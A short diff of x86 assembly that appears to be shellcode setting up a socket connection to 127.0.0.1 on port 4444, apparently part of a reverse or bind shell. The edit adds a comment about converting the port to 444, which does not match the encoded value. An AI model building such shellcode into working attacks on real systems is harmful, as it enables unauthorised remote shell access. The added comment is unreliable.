@@ -17,7 +17,7 @@ section .text
     mov   ebx, 0xfeffff80
     xor   ebx, eax
     push  ebx             ; [$esp]: 127.0.0.1
-    push  word 0x5c11     ; [$esp]: 4444
+    push  word 0x5c11     ; [$esp]: 4444 ; must convert it to 444
     push  word 0x02       ; [$esp]: AF_INET
 
     ; call socket(domain, type, protocol)
